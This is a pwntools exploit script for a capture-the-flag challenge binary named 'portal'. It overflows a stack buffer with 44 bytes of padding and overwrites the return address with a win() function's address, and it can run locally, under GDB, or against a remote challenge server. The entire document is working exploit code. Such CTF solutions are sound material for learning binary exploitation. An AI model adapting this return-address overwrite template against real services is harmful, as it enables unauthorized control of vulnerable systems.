#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("portal")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 11723)
    else:
        return process(elf.path)

io = start()

# win() addr: 0x08049208
# offset to 'ret' is at 44

offset = b"A"*44
win_addr = 0x08049208
payload = offset + p32(win_addr)

io.recv()
io.sendline(payload)

io.interactive()
